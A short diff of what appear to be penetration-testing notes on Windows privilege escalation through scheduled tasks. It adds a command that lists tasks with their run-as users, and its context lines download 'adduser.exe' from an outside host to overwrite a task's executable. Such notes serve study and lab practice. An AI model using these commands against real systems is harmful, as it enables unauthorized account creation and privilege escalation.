@@ -78,6 +78,7 @@ schtasks /query /fo LIST /v
 schtasks /query /v /fo list | findstr /i "backup.exe"
 schtasks /query /fo LIST /v /tn "backup runner(taskname)" ----for retrieve full task info
 Get-ScheduledTask | Where-Object {$_.TaskName -like '*backup*'}
+schtasks /query /v /fo CSV | ConvertFrom-Csv | Select 'Author', 'TaskName', 'Task To Run', 'Run As User', 'Next Run Time'
 
 icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
 iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
